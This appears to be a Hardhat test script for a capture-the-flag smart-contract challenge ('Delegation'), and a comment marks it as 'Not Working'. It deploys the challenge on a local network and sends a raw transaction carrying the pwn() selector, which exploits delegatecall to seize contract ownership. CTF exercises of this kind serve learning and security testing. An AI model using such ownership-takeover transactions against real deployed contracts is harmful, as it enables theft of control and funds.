import { loadFixture } from "@nomicfoundation/hardhat-network-helpers";
import { expect } from "chai";
import { Interface } from "ethers/lib/utils";
import { ethers } from "hardhat";

// Not Working
describe("Delegation exploit", () => {
  async function deployDelegationFixture() {
    const [deployer, attacker] = await ethers.getSigners();

    const DelegationFactory = await ethers.getContractFactory("DelegationFactory");
    const delegationFactory = await DelegationFactory.connect(deployer).deploy();

    // Simulate createInstance to get return value of the function
    const delegationAddress = await delegationFactory.connect(deployer).callStatic.createInstance(attacker.address);

    const tx = await delegationFactory.connect(deployer).createInstance(attacker.address);
    await tx.wait();

    const delegation = await ethers.getContractAt("Delegation", delegationAddress);

    return { attacker, delegation, delegationFactory };
  }

  it("Should claim ownership", async () => {
    const { attacker, delegation, delegationFactory } = await loadFixture(deployDelegationFixture);

    const abi = ["function pwn() public"];
    const iface = new Interface(abi);
    const selector = iface.getSighash("pwn()");

    console.log(
      "------------------------------------------------------- DelegationFactory : ",
      delegationFactory.address
    );
    console.log("------------------------------------------------------- Attacker : ", attacker.address);
    console.log("------------------------------------------------------- Owner Before : ", await delegation.owner());

    const tx = await attacker.sendTransaction({
      to: delegation.address,
      data: selector,
    });

    await tx.wait();

    const newOwner = await delegation.owner();

    console.log("------------------------------------------------------- newOWner : ", newOwner);

    // Check if the owner is set.
    const success = await delegationFactory.validateInstance(delegation.address, attacker.address);
    expect(success).to.equal(true, "Delegation Failed!!!");
    //expect(newOwner).to.be.equal(attacker.address, "Failed!!!");
  });
});
